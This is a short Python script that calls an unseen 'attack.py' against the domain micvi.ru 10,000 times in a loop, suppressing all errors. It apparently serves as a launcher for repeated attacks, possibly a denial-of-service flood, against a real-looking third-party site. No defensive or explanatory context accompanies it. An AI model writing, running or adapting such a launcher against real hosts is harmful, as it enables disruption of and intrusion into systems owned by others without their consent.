import subprocess

if __name__ == '__main__':
    for i in range(0, 10000):
        try:
            output = subprocess.check_output(['python', 'attack.py', 'micvi.ru'], shell=True)
            print(output)
        except:
            pass
